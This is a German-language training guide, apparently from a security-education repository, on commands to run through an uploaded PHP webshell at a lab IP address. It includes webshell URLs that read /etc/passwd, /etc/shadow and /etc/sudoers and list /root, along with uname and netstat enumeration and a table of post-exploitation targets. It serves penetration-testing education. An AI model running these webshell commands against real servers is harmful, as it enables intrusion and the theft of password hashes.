# 🐚 PHP Webshell – Usage & Enumeration Guide




## Inhaltsverzeichnis
- [Einleitung](#einleitung)
- [Beispielhafte Webshell-Aufrufe](#beispielhafte-webshell-aufrufe)
- [Systeminformationen ermitteln](#systeminformationen-ermitteln)
- [Netzwerküberblick](#netzwerküberblick)
- [Typische Ziele nach Webshell-Zugriff](#typische-ziele-nach-webshell-zugriff)
- [Siehe auch](#siehe-auch)
- [Haftungsausschluss](#haftungsausschluss)



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Einleitung

Diese Datei dokumentiert typische **Post-Exploitation-Kommandos**, die nach erfolgreicher Platzierung einer PHP-Webshell (`cmdshell.php3`) ([mehr zu cmdshell](/03-web-security/phpWebShell/php_rce_cheat_sheet.md)) auf einem Zielsystem ausgeführt werden können.  
Der Zugriff erfolgt über einen GET-Parameter `cmd`, der Systembefehle auf dem Server ausführt.

> ⚠️ Hinweis: Diese Vorgehensweise dient ausschließlich Schulungs- und Testzwecken innerhalb legaler Testumgebungen oder CTF-Szenarien.




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Beispielhafte Webshell-Aufrufe

Die folgenden URLs zeigen den Zugriff auf die Webshell:

```bash
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=[COMMAND]
```

**Beispielhafte Kommandos:**
```bash
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/passwd
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/shadow
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/group
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/group | grep admin
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/sudoers
```
**Dateisystem & Benutzerverzeichnisse durchsuchen:**
```bash
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=ls -la /var/www
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=ls -la /home
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=ls -la /root
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=id
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Systeminformationen ermitteln

```bash
uname -a        # vollständige Systeminformationen
uname -s        # Kernel-Name
uname -n        # Netzwerkname des Hosts
uname -r        # Kernel-Version
uname -v        # Kernel-Build
uname -m        # Architektur (z. B. x86_64)
uname -p        # Prozessor
uname -i        # Hardware-Plattform

pwd             # aktuelles Verzeichnis
whoami          # aktueller Benutzer
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Netzwerküberblick

### Netstat-Befehle zur Analyse aktiver Verbindungen:

```bash
netstat         # allgemeine Übersicht
netstat -a      # alle Verbindungen und Ports
netstat -at     # nur TCP
netstat -au     # nur UDP
netstat -l      # nur "listening" Ports
netstat -lp     # mit Prozessinfos (sofern verfügbar)
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Typische Ziele nach Webshell-Zugriff

| Ziel            | Zielsetzung                     |
| --------------- | ------------------------------- |
| `/etc/passwd`   | Benutzerkonten einsehen         |
| `/etc/shadow`   | Passwort-Hashes (nur als root)  |
| `/etc/group`    | Gruppenzugehörigkeiten          |
| `/etc/sudoers`  | Sudo-Rechte prüfen              |
| `/var/www/`     | Web-Inhalte durchsuchen         |
| `/home/`        | Benutzerverzeichnisse einsehen  |
| `/root/`        | Admin-Account analysieren       |
| `id`, `whoami`  | User-Kontext prüfen             |
| `netstat`, `ss` | Netzwerkservices identifizieren |
| `uname -a`      | Systemplattform identifizieren  |




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Siehe auch
- [php_rce_cheat_sheet.md](/03-web-security/angriffe/webshells/php_rce_cheat_sheet.md)
- [sql_injection_to_shell.md](/03-web-security/angriffe/sql-injektionen/sql_injection_to_shell.md)
- [post_exploitation_tools.md](/04-host-security/post_exploitation_tools.md)




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---